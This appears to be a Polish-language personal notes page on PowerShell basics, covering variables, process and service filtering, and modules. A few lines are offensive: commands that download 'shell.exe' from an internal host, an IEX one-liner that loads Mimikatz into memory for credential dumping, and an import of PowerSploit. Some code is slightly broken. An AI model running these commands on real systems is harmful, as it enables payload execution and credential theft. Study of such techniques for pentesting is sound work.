---
layout:
  title:
    visible: false
  description:
    visible: false
  tableOfContents:
    visible: false
  outline:
    visible: false
  pagination:
    visible: false
---

# powershell

odpalamy ISE

{% code overflow="wrap" fullWidth="true" %}
```python
#zmienne
$var

#jeśli chcemy żeby zmienna przyjęła wartość którą wpisze użytkownik w terminalu po słowie username
$user = read-host "username"

#zmieniamy string na secure string
read-host "password" -Assecurestring

#zmienna przyjmuje wartość ścieżki gdzie się akurat znajdujemy, w jakim katalogu
$What_else=Get-Location

#żeby zobaczyć jakie funkcje i atrybuty ma dany objekt
$What_else | Get-Member

#przykład
$var1=7
$var2=8
$var3=$var1+$var2

Write-Host $var3

$var4="Pierwszy string"
$var5="Drugi string"

$var1.GetType()

#wylistowanie wszystkich procesów, które mają w sobie słowo Broker
Get-Process | where-object {$_.ProcessName -match "Broker"}

#wylistowanie wszystkich procesów, które mają w sobie słowo Broker lub edge
Get-Process | where-object {$_.ProcessName -match "Broker" -or $_.ProcessName -match "edge"}

#wylistowanie wszystkich procesów, które mają w sobie słowo Broker lub edge i pisze komunikat
Get-Process | where-object {$_.ProcessName -match "Broker" -or $_.ProcessName -match "edge"} | ForEach-Object {if($_.ProcessName -eq "msedge") {write-host "to jest Edge"} else {write-host "To nie jest edge. To jest proces: " $_.ProcessName} }

#wylistowanie wszystkich serwisów, które mają w sobie słowo xbox lub webclient
serwisy = Get-Service | ? {$_.DisplayName -match "Xbox" -or $_.DisplayName -eq "WebClient"}

foreach($serwis in $serwisy){

if($serwis.DisplayName -match "Xbox")
{
Write-Host -NoNewline "To sa serwisy zwiazane z xbox: "
write-host $serwis.DisplayName
}
else
{
write-host "To jest jakis inny serwis:" $serwis.DisplayName
}
}

#kopiowanie pliku z komputera zdalngo
Invoke-WebRequest -Uri http://10.20.10.31:8080/shell.exe -OutFile C:\Users\mike\Desktop\shell.exe
IWR -Uri http://10.20.10.31:8080/shell.exe -OutFile C:\Users\mike\Desktop\shell.exe
(New-Object System.Net>WebClient).DownloadFile("http://10.20.10.31:8080/shell.exe","C:\Users\mike\Desktop\shell.exe")

#załadowanie Mimikatz do pamięci RAM
IEX(New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1")")
Invoke-Mimikatz

#ładowanie modułów
Get-Module

#szukanie komend, które mają słowo Servi w nazwie
Get-Command -Noun "servi*"

#jakie komendy oferuje nam dany moduł
Get-Command -Module Microsoft.PowerShell.Management

#importujemy moduły - jesteśmy w katalogu gdzie zapisane są skrypty
Import-Module .\PowerSploit.psd1
Get-Module PowerSploit | select*

#jakie komendy możemy użyć w PowerSploit
Get-Command -Module PowerSploit
```
{% endcode %}
